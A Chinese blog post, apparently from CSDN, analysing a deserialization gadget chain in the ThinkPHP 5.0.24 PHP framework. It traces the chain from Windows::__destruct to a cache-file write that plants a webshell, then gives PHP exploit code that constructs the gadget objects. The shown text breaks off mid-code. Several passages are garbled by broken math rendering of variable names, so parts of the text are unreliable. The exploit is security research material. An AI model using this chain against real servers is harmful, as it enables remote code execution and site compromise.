{"blogid": "125402902", "writerAge": "码龄2年", "writerBlogNum": "191", "writerCollect": "247", "writerComment": "197", "writerFan": "431", "writerGrade": "5级", "writerIntegral": "2557", "writerName": "Sk1y", "writerProfileAdress": "writer_image\\profile_125402902.jpg", "writerRankTotal": "14503", "writerRankWeekly": "38713", "writerThumb": "251", "writerVisitNum": "161163", "blog_read_count": "1621", "blog_time": "于 2022-06-22 09:31:19 发布", "blog_title": "thinkphp5.0.24反序列化漏洞分析", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"thinkphp5024_0\"></a>thinkphp5.0.24反序列化漏洞分析</h1>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#thinkphp5024_0\">thinkphp5.0.24反序列化漏洞分析</a></li><li><ul><li><a href=\"#_17\">具体分析</a></li><li><ul><li><a href=\"#_19\">反序列化起点</a></li><li><a href=\"#toArray_49\">toArray</a></li><li><a href=\"#getRelationData_61\">getRelationData分析</a></li><li><a href=\"#modelRelation_90\">$modelRelation生成</a></li><li><a href=\"#__callif_117\">进入__call前的两个if</a></li><li><a href=\"#__call_140\">__call</a></li><li><a href=\"#_168\">虚假的写文件</a></li><li><a href=\"#setTagItem_186\">setTagItem</a></li><li><a href=\"#exit_201\">绕过exit</a></li></ul>\n</li><li><a href=\"#exp_241\">exp</a></li><li><a href=\"#pop_365\">pop链图</a></li><li><a href=\"#windows_373\">解决windows下的文件名问题</a></li><li><a href=\"#_397\">参考链接</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<p>thinkphp5框架：</p>\n<p><img alt=\"image-20220615000257518\" src=\"image\\0301a73095b0f68ece745a1de0b02aab.png\"/></p>\n<p>thinkphp5的入口文件在<code>public\\index.php</code>，访问</p>\n<pre><code class=\"prism language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//192.168.64.105/thinkphp_5.0.24/public/index.php</span>\n</code></pre>\n<p><img alt=\"image-20220615000539160\" src=\"image\\cbbdb7d8d83696db7923e4e7db8d592c.png\"/></p>\n<h2><a id=\"_17\"></a>具体分析</h2>\n<h3><a id=\"_19\"></a>反序列化起点</h3>\n<p>写一个反序列化入口点</p>\n<p><img alt=\"image-20220615001131637\" src=\"image\\c3b9aa5d36b2fb8301ac09851ad82c9e.png\"/></p>\n<p>全局搜索<code>__destruct()</code>函数</p>\n<p><img alt=\"image-20220615001115342\" src=\"image\\d569c5e156cdf20407811704f81fd6fe.png\"/></p>\n<p><code>\\thinkphp_5.0.24\\thinkphp\\library\\think\\process\\pipes\\Windows.php</code>中的<code>__destruct()</code>函数，调用了removeFiles()</p>\n<p><img alt=\"image-20220615001339350\" src=\"image\\507e3eebbacc0f974f508488de2423c0.png\"/></p>\n<p>跟进removeFiles()，第163行的file_exists可以触发<code>__toString</code>方法</p>\n<p><img alt=\"image-20220615001418986\" src=\"image\\81b75bd81510452d206547dcb25e1f2d.png\"/></p>\n<p>全局搜索<code>__toString方法</code></p>\n<p>在<code>thinkphp\\library\\think\\Model.php</code>的第2265行，发现其调用了<code>toJson方法</code></p>\n<p><img alt=\"image-20220616230519422\" src=\"image\\0cf6632ca0d262adfb6d0f7774e6bf32.png\"/></p>\n<p>跟进<code>toJson</code>，发现其调用了toArray()方法（在Model.php中）</p>\n<p><img alt=\"image-20220616230630861\" src=\"image\\7ffa68b01b1b20b44572384fc0a77a2e.png\"/></p>\n<h3><a id=\"toArray_49\"></a>toArray</h3>\n<p>跟进<code>toArray</code>，发现其有三处可以调用<code>__call</code>方法（就是整一个可以控制的类对象，然后让其调用该类不存在的方法，然后触发<code>__call</code>魔术方法）</p>\n<blockquote>\n<p>__call()，在对象中调用一个不可访问方法时调用。</p>\n</blockquote>\n<p><img alt=\"image-20220616231036322\" src=\"image\\986c4ea16864ff47df7223c607d96b3d.png\"/></p>\n<p>着重看第三处，也就是第912行，这个需要我们控制$value变量</p>\n<p>这个$value变量是根据<code> $value = $this-&gt;getRelationData($modelRelation);</code>而来的</p>\n<h3><a id=\"getRelationData_61\"></a>getRelationData分析</h3>\n<p>跟进<code>getRelationData</code>方法，注意参数<code>$modelRelation</code>需要是<code>Relation</code>类型的，该方法也是<code>thinkphp\\library\\think\\Model.php</code>中定义的</p>\n<p><img alt=\"image-20220616235535073\" src=\"image\\ae8ca0c891c5a6653a8e27daa9c47fbc.png\"/></p>\n<p>如果我们让if满足，那么<code>$value=$this-&gt;parent</code>，看三个条件</p>\n<ol><li><code>$this-&gt;parent</code>存在且可控</li><li>第二个条件<code>!$modelRelation-&gt;isSelfRelation()</code>，跟进<code>isSelfRelation()</code>方法，该方法在<code>thinkphp\\library\\think\\model\\Relation.php</code>中定义，返回$this-&gt;selfRelation，可控</li></ol>\n<p><img alt=\"image-20220617230450476\" src=\"image\\b5ca5a71192d7d036fd83282d7929afe.png\"/></p>\n<ol start=\"3\"><li>第三个条件<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code>，也就是</li></ol>\n<p>跟进<code>getModel()函数</code>，该函数在<code>thinkphp\\library\\think\\model\\Relation.php</code>，返回<code>$this-&gt;query-&gt;getModel()</code>，其中$query可控</p>\n<p><img alt=\"image-20220617230828281\" src=\"image\\613e18dbe49f91ae8ede2419a7d81c68.png\"/></p>\n<p>所以我们要查哪个类的getModel()可控，最后找到了<code>thinkphp\\library\\think\\db\\Query.php</code>的getModel方法，该方法返回<code>$this-&gt;model</code>，并且$this-&gt;parent可控</p>\n<p><img alt=\"image-20220617231051519\" src=\"image\\fd0db9c04eb68a0b89ff98c5b5fc6217.png\"/></p>\n<p>三个条件都满足，执行<code>$value = $this-&gt;parent; return $value;</code>，也就是<code>\\think\\console\\Output</code></p>\n<p>该函数分析到这里</p>\n<h3><a id=\"modelRelation_90\"></a>$modelRelation生成</h3>\n<p>上面分析了函数的执行过程，接下来分析我们怎么能传入一个<code>Relation类</code>的$modelRelation参数</p>\n<p>发现$relation()函数是根据$relation的值进行调用的，需要满足if条件method_exists</p>\n<p><img alt=\"image-20220617231704327\" src=\"image\\2f5ebd32a906c0bc4faa709d8fd971ea.png\"/></p>\n<p>跟进<code>Loader::parseName</code>瞅一瞅，这个函数也只是对传入的<code>$name</code>进行了一些大小写的替换，没有一些很严格的过滤操作，因为<code>$name</code>可控，所以$relation可控</p>\n<p><img alt=\"image-20220617232020032\" src=\"image\\9a1c322ca72af58cb89e154386f5b3d4.png\"/></p>\n<p>在$relation可控的前提下，要满足这个method_exists，则需要将$relation设定为$this（也就是thinkphp\\library\\think\\Model.php）中存在的方法</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">method_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$relation</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>这里选择getError，因为其不仅在Model类中定义，且error可控</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\381622a681554762b5b4be0842db5c7c.png\"/></p>\n<p>所以我们只要设置了$error，那么其值就会通过<code> $modelRelation = $this-&gt;$relation();</code>传给$modelRelation ，因为relation()也就是<code> Error()</code>，所以就是<code>$modelRelation = $this-&gt;Error()</code>，即<code>$modelRelation = $error</code></p>\n<p>modelRelation分析到这里，而我们传的<code>$error</code>是什么，接下来会分析，其实就是<code>HasOne</code>类</p>\n<h3><a id=\"__callif_117\"></a>进入__call前的两个if</h3>\n<p>接下来要分析两个if条件</p>\n<p><img alt=\"image-20220617233102696\" src=\"image\\539b7b5361677c6a95e0cd08258d7e2c.png\"/></p>\n<p>我们看第一个if，要满足<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        m\n       \n       \n        o\n       \n       \n        d\n       \n       \n        e\n       \n       \n        l\n       \n       \n        R\n       \n       \n        e\n       \n       \n        l\n       \n       \n        a\n       \n       \n        t\n       \n       \n        i\n       \n       \n        o\n       \n       \n        n\n       \n       \n        这\n       \n       \n        个\n       \n       \n        类\n       \n       \n        中\n       \n       \n        存\n       \n       \n        在\n       \n       \n        g\n       \n       \n        e\n       \n       \n        t\n       \n       \n        B\n       \n       \n        i\n       \n       \n        n\n       \n       \n        d\n       \n       \n        A\n       \n       \n        t\n       \n       \n        t\n       \n       \n        r\n       \n       \n        (\n       \n       \n        )\n       \n       \n        函\n       \n       \n        数\n       \n       \n        ，\n       \n       \n        而\n       \n       \n        且\n       \n       \n        下\n       \n       \n        一\n       \n       \n        个\n       \n       \n        ‘\n       \n      \n      \n       modelRelation这个类中存在getBindAttr()函数，而且下一个`\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">m</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\" style=\"margin-right: 0.00773em;\">R</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.01968em;\">l</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\">n</span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">存</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">g</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right: 0.05017em;\">B</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mopen\">(</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">而</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">下</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord\">‘</span></span></span></span></span>bindAttr`是该函数的返回值</p>\n<p>全局搜索getBindAttr</p>\n<p><img alt=\"image-20220617233345853\" src=\"image\\64b853fa3aaf115debe75b275f006c00.png\"/></p>\n<p><img alt=\"image-20220620155134075\" src=\"image\\d2a9da8995f26ca67b26f6ec5e043f11.png\"/></p>\n<p>其在OneToOne.php中定义，该类是个抽象类，且OneToOne类是Relation类的派生类，其$this-&gt;bindAttr可控</p>\n<p>我们搜索继承OneToOne的类，发现HasOne类，所以可以<code>让$modelRelation的值为HasOne</code>，这个也满足<code>getRelationData()传入的是Relation类对象</code>的要求，并且bindAttr可控，满足第二个if条件，简直完美！！！</p>\n<p><img alt=\"image-20220617233841235\" src=\"image\\e76200ef7a14c9080ee80f29721175b6.png\"/></p>\n<p>其实下面还有一个if，但是我们简单看下，将$bindAttr的键值对中的键给$key，然后进行isset判断，当已经定义才满足if，我们要进入的是不满足if条件的时候</p>\n<p><img alt=\"image-20220617234621780\" src=\"image\\7c99c9024e8961b1130618822f5f6148.png\"/></p>\n<h3><a id=\"__call_140\"></a>__call</h3>\n<p>然后进入<code>__call</code>，要选择一个能写webshell的类的<code>__call</code>方法，选择了<code>thinkphp\\library\\think\\console\\Output.php</code></p>\n<p>所以上面的$value应该是一个<code>thinkphp\\library\\think\\console\\Output.php</code>类对象</p>\n<p><img alt=\"image-20220617114358393\" src=\"image\\fcb86e9dc561486ceb2a28131ad10d04.png\"/></p>\n<p>在这里<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        m\n       \n       \n        e\n       \n       \n        t\n       \n       \n        h\n       \n       \n        o\n       \n       \n        d\n       \n       \n        和\n       \n      \n      \n       method和\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">m</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\">d</span><span class=\"mord cjk_fallback\">和</span></span></span></span></span>this-&gt;styles是可控的，array_unshift()对调用block()方法没有影响，可以执行<code>block</code>方法，跟进Output的<code>block</code>方法</p>\n<p><img alt=\"image-20220617114621530\" src=\"image\\4f6de3fb40a1aa24a4fb993595360576.png\"/></p>\n<p>跟进<code>writeln</code>方法</p>\n<p><img alt=\"image-20220617114702866\" src=\"image\\ba43c9c3c83ab558d8de902235698152.png\"/></p>\n<p>跟进write方法</p>\n<p><img alt=\"image-20220617114808021\" src=\"image\\315c203b635ee6933709619b9ceca168.png\"/></p>\n<p>handle属性可控，所以全局搜索<code>write</code>方法</p>\n<p><code>thinkphp\\library\\think\\session\\driver\\Memcached.php</code>的write方法</p>\n<p><img alt=\"image-20220617114921780\" src=\"image\\1395e5ba955f423d102fc371e1765780.png\"/></p>\n<p>而$this-&gt;handler可控，所以全局搜索可用的set方法</p>\n<h3><a id=\"_168\"></a>虚假的写文件</h3>\n<p>在<code>thinkphp\\library\\think\\cache\\driver\\File.php</code>中，set方法可以使用<code>file_put_contents</code>写文件，第158行的exit可以使用伪协议进行绕过</p>\n<p><img alt=\"image-20220617194846677\" src=\"image\\3f6f3b6dcc68bf59fed0865eb84ba12c.png\"/></p>\n<p>初步来看可以利用file_put_contents来写文件，我们跟入<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        d\n       \n       \n        a\n       \n       \n        t\n       \n       \n        a\n       \n       \n        和\n       \n      \n      \n       data和\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">a</span><span class=\"mord cjk_fallback\">和</span></span></span></span></span>filename，看<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        d\n       \n       \n        a\n       \n       \n        t\n       \n       \n        a\n       \n       \n        与\n       \n      \n      \n       data与\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">a</span><span class=\"mord cjk_fallback\">与</span></span></span></span></span>filename是否可控</p>\n<ol><li><code>$filename</code>的值是由getCacheKey()方法决定的，跟进getCacheKey，可以知道filename的后缀名是php，是写死的，文件名部分可控</li></ol>\n<p><img alt=\"image-20220618001440689\" src=\"image\\c3beff3614ed9410b1c3508fc83989e9.png\"/></p>\n<ol start=\"2\"><li>跟进$data，发现$data是已经被写死了，$value的值只能为true</li></ol>\n<p><img alt=\"image-20220617201921089\" src=\"image\\a79222885763f21ecdab95503ac1a0a6.png\"/></p>\n<p>所以就是file_put_contents可以写文件，但是内容不可控</p>\n<h3><a id=\"setTagItem_186\"></a>setTagItem</h3>\n<p>所以继续看set接下来的代码，调用了setTagItem()</p>\n<p><img alt=\"image-20220617202106451\" src=\"image\\ad87dcde46868c5abf281b406c4dc190.png\"/></p>\n<p>进入<code>thinkphp\\library\\think\\cache\\Driver.php</code>的<code>setTagItem</code>方法，（注意File类继承了Driver类，但是Driver是一个抽象类）并且会再执行一次set方法，这一次$key是由$this-&gt;tage而来，可控；$value由$name而来，也是可控的</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\acc45e4c57f143ab8c266d277b897928.png\"/></p>\n<p>但是windows对文件名有相应的要求，所以复现不容易</p>\n<h3><a id=\"exit_201\"></a>绕过exit</h3>\n<p>上面已经分析得很详细了，这里简单调试分析一下</p>\n<p>到$value</p>\n<p><img alt=\"image-20220621201707779\" src=\"image\\59febd0acd4d74df53b7edcd27794b80.png\"/></p>\n<p>到set方法这里，着重看一下，第一次整的时候，直接报错了，转到异常处理了，</p>\n<p><img alt=\"image-20220621202647751\" src=\"image\\371678ac778d218260b4008e2ffe04cc.png\"/></p>\n<p>这里是因为我的文件名不符合要求，所以先随便写一个，看接下来怎么走</p>\n<p>随便写一个之后，走到setTagItem()这里，这里$tag是可控的，所以$key是可控的</p>\n<p><img alt=\"image-20220621203338705\" src=\"image\\e08134326301ae1396571349efc20253.png\"/></p>\n<p>这个第二次调用set函数，$key可知，$value可控</p>\n<p><img alt=\"image-20220621230309625\" src=\"image\\b5bf33c72225118ea57014622f8e6a11.png\"/></p>\n<p>放在linux运行，生成了对应的文件</p>\n<p><img alt=\"image-20220621232215812\" src=\"image\\af781262ddd26a00f4bba6a2bcfb4baf.png\"/></p>\n<p>查看</p>\n<p><img alt=\"image-20220621232244578\" src=\"image\\779d8e96d59c564cd668cc3e2e993b41.png\"/></p>\n<p>这里虽然看着是加了<code>'</code>，但是其实并没有，注意访问的时候，将<code>?</code>进行url编码一下</p>\n<p>注意需要将php的<code>short_open_tag</code>设为<code>Off</code>，不然会将<code>&lt;??&gt;</code>之间的内容识别为php代码，但是&lt;? 之后是cuc，不符合语法，所以报错</p>\n<p><img alt=\"image-20220622085044431\" src=\"image\\3737ef4a80bd4a6170cb16f316d7c436.png\"/></p>\n<h2><a id=\"exp_241\"></a>exp</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>process<span class=\"token punctuation\">\\</span>pipes</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Pivot</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pipes</span>\n<span class=\"token punctuation\">{<!-- --></span><span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//Windows类中有$files数组 通过file_exists触发__toString方法</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Windows</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Pipes</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//$files是个数组</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//触发Model类的toString()方法，因为Model是一个抽象类，所以选择其派生类Pivot</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\"># Model抽象类</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation<span class=\"token punctuation\">\\</span>HasOne</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console<span class=\"token punctuation\">\\</span>Output</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$error</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$parent</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#修改处</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$aaaaa</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">parent</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">//调用__call()</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">append</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'getError'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">//会用foreach将append中的值传给$name，传给$relation,调用getError(),将下面的error传给$modelRelation</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">error</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HasOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">//最后传给$modelRelation</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//isSelfRelation()</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">//用于判断getRelationData()中if条件的第三个</span>\n\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">#Relation抽象类 之后的Output是Relation的派生类</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span>  \n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>Query</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Relation</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$selfRelation</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">selfRelation</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\"># 这个用于判断getRelationData()中if条件的第二个</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">query</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#class Query</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">#OneToOne HasOne  用于传给$modelRelation，主要是用于满足if条件，进入value-&gt;getAttr()</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>relation</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>Relation</span><span class=\"token punctuation\">;</span>   \n<span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">OneToOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Relation</span><span class=\"token punctuation\">{<!-- --></span> <span class=\"token comment\"># OneToOne抽象类</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// HasOne</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">HasOne</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">OneToOne</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword static-context\">parent</span><span class=\"token operator\">::</span><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">bindAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"123\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># 这个需要动调，才能之后为什么这么写，待会说    </span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\n\n<span class=\"token comment\">#Output  进入Output-&gt;__call()</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>console</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>session<span class=\"token punctuation\">\\</span>driver<span class=\"token punctuation\">\\</span>Memcached</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Output</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$styles</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">handle</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Memcached</span><span class=\"token punctuation\">(</span><span class=\"token 